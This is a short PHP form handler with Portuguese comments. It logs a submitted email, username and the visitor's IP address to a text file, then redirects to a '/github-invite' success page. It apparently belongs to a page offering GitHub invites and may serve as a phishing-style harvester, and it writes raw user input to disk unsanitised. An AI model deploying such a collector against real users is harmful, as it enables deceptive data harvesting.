<?php


// recebe as entradas de dados do usuario
$email   = $_POST['email'];
$usuario = $_POST['usuario'];
$ipOrigem = $_SERVER['REMOTE_ADDR'];

// cria linha no arquivo
$line = "email: $email - usuario: $usuario - ip origem: $ipOrigem " . PHP_EOL;

// salva no arquivo
file_put_contents('lista.txt', $line ,FILE_APPEND);

sleep(1);

header('Location: /github-invite/sucesso.html');